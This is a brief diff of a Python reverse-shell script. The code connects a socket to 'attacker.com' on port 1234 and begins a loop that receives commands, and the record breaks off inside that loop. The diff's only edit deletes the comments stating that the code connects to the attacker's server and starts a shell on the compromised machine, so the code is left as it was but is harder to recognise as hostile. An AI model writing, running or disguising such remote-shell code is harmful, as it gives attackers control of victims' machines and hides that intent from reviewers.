@@ -1,13 +1,13 @@
 import socket
 import subprocess
 
-# Connect to the attacker's remote server
+
 server_ip = 'attacker.com'
 server_port = 1234
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((server_ip, server_port))
 
-# Start a shell on the compromised machine
+
 while True:
     data = sock.recv(1024)
     if not data:
